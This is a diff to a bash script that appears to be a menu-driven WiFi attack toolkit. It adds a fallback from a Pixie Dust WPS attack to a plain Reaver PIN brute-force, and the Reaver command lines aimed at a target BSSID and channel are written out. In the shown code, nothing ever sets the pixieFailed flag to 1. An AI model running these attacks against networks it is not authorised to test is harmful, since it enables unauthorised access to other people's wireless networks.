@@ -27,6 +27,7 @@
 ############################################################################
 
 # v1.8
+# - Added a check for PixieWPS attacks. If failed, will now default to normal Reaver attack.
 
 # v1.7
 # - Currently supports up to 10 wifi adapters.
@@ -902,6 +903,9 @@ setDefaultsWPS(){
 	# -K Argument Number (Default 1)
 	pixieNumber="1"
 
+	# Check to see if Pixie Attack Failed
+	pixieFailed="0"
+
 
 	wifite="wifite"
 	wifiteAttackAll="wifite --all"
@@ -1230,7 +1234,6 @@ menuUpdate(){
 	echo ""
 	$white
 	echo "Remote Version: v$versionRemote"
-	echo ""
 	echo ""
 	echo ""
 	echo ""
@@ -5287,6 +5290,19 @@ menuAttacksWPS(){
 		#$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv -K $pixieNumber
 		$reaver -i $interfaceMonitor -b $bssid -c $channel -vv -K $pixieNumber
 		#read pause
+
+		case "$pixieFailed" in
+	
+			"1")
+			echo ""
+			echo ""
+			echo "Pixie Attack Failed! Starting Normal Reaver Attack"
+			echo ""
+			echo ""
+			$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv
+			;;
+
+		esac
 		;;
 	
 		"2")
